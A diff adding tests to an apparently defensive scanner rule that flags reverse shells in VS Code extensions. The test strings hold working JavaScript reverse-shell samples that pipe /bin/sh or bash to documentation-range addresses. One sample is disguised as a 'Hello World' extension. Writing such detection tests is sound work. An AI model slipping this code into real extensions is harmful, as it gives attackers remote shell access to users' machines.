@@ -49,6 +49,46 @@ def test_fires_critical_on_reverse_shell_wiring(make_context: MakeContext) -> No
     assert finding.evidence  # at least the pipe-wiring line is cited
 
 
+def test_fires_on_nf3xn_bin_sh_connectback(make_context: MakeContext) -> None:
+    # nf3xn regression: the yo-code "Hello World" template with a /bin/sh
+    # connect-back reverse shell. Distinct from securezeron only in low-intensity
+    # deltas (onCommand activation, ms-vscode publisher spoof) that do NOT change
+    # the RS1 conjunction — s10 still convicts. Synthetic, documentation-range C2.
+    src = """
+    const cp = require("child_process");
+    const net = require("net");
+    function helloWorld() {
+      const sh = cp.spawn("/bin/sh", []);
+      const sock = net.connect(4444, "203.0.113.10", () => {
+        sock.pipe(sh.stdin);
+        sh.stdout.pipe(sock);
+        sh.stderr.pipe(sock);
+      });
+    }
+    exports.activate = (ctx) => ctx.subscriptions.push(helloWorld);
+    """
+    ctx = make_context(files={"extension.js": src})
+    findings = ReverseShellRule().evaluate(ctx)
+    assert len(findings) == 1
+    assert findings[0].severity.value == "critical"
+
+
+def test_fires_on_manual_stdin_write_bridge(make_context: MakeContext) -> None:
+    # nf3xn spec §4a: the reverse-shell variant that bridges socket<->shell with a
+    # manual `socket.on("data", d => proc.stdin.write(d))` instead of `.pipe()`.
+    # The stdin.write wiring conjunct must catch it within the full conjunction.
+    src = """
+    const { spawn } = require("child_process");
+    const net = require("net");
+    const sh = spawn("/bin/bash", []);
+    const sock = net.connect(9001, "203.0.113.30");
+    sock.on("data", (d) => sh.stdin.write(d));
+    sh.stdout.on("data", (d) => sock.write(d));
+    """
+    ctx = make_context(files={"ext.js": src})
+    assert len(ReverseShellRule().evaluate(ctx)) == 1
+
+
 def test_fires_on_tls_socket_variant(make_context: MakeContext) -> None:
     # Encrypted-channel evasion: tls.connect instead of net.Socket still trips
     # the socket conjunct, so the conjunction holds.
